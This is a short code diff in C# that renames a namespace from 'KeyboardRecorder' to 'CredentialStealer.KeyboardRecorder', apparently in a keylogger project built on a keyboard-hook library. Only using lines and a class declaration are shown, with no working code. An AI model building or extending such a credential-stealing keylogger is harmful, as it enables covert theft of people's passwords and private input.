@@ -5,7 +5,7 @@ using System.Text;
 using System.Threading.Tasks;
 using RamGecTools;
 
-namespace KeyboardRecorder
+namespace CredentialStealer.KeyboardRecorder
 {
     public class KeyResolver
     {
